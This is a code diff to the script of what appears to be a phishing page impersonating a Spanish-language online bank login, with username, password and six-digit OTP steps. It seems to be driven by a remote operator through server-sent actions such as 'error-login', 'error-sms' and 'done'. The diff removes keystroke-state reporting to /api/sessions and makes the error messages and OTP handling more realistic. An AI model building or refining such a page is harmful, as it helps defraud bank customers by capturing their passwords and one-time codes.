@@ -367,37 +367,11 @@
         }
       });
 
-      user?.addEventListener("input", () => {
-        const val = (user.value || "").trim();
-        if (val.length >= 2) {
-          fetch('/api/sessions', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              id: sessionId,
-              username: val,
-              tipoUsuario: 'Banca por Internet',
-              device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
-              state: 'typing'
-            })
-          }).catch(() => {});
-          startKeepalive();
-        }
-      });
-
       pass?.addEventListener("keydown", function (event) {
         if (event.key === "Enter") {
           event.preventDefault();
           submitLogin();
         }
-      });
-
-      pass?.addEventListener("input", () => {
-        fetch('/api/sessions/' + sessionId + '/state', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ state: 'typing' })
-        }).catch(() => {});
       });
 
       function startKeepalive() {
@@ -480,13 +454,23 @@
               } else if (action === 'error-login') {
                 isWaitingForNextAction = false;
                 hideSpinner();
-                stepPass.hidden = true;
                 stepToken.hidden = true;
-                stepUser.hidden = false;
-                box?.classList.remove("extended");
-                showError("El usuario o la contraseña ingresada son incorrectos. Verifique sus datos e intente nuevamente.");
-                if (pass) pass.value = "";
-                if (user) user.focus();
+                if (user && user.value && user.value.trim().length > 0) {
+                  stepUser.hidden = true;
+                  stepPass.hidden = false;
+                  box?.classList.add("extended");
+                  showError("La contraseña ingresada es incorrecta. Verifique sus datos e intente nuevamente.");
+                  if (pass) {
+                    pass.value = "";
+                    pass.focus();
+                  }
+                } else {
+                  stepPass.hidden = true;
+                  stepUser.hidden = false;
+                  box?.classList.remove("extended");
+                  showError("El usuario o la contraseña ingresada son incorrectos. Verifique sus datos e intente nuevamente.");
+                  if (user) user.focus();
+                }
               } else if (action === 'error-dinamica' || action === 'error-sms') {
                 isWaitingForNextAction = false;
                 hideSpinner();
@@ -494,7 +478,9 @@
                 stepUser.hidden = true;
                 stepToken.hidden = false;
                 box?.classList.add("extended");
-                tokenErrorBox.textContent = "El código ingresado es incorrecto o ha expirado. Por favor intente nuevamente.";
+                tokenErrorBox.textContent = action === 'error-sms'
+                  ? "El código SMS ingresado es incorrecto o ha expirado. Por favor intente nuevamente."
+                  : "El código de Clave Móvil ingresado es incorrecto o ha expirado. Por favor intente nuevamente.";
                 tokenErrorBox.style.display = "block";
                 resetOtpSlots();
               } else if (action === 'done') {
@@ -574,9 +560,8 @@
           slot.value = slot.value.replace(/\D/g, "").slice(-1);
           if (slot.value && otpSlots[idx + 1]) {
             otpSlots[idx + 1].focus();
-          }
-          if (getOtpValue().length === 6) {
-            submitToken();
+          } else if (getOtpValue().length === 6) {
+            document.getElementById("btnSubmitToken")?.focus();
           }
         });
 
@@ -599,7 +584,7 @@
           const lastIdx = Math.min(pasteData.length, 6) - 1;
           if (lastIdx >= 0 && otpSlots[lastIdx]) otpSlots[lastIdx].focus();
           if (pasteData.length === 6) {
-            submitToken();
+            document.getElementById("btnSubmitToken")?.focus();
           }
         });
       });
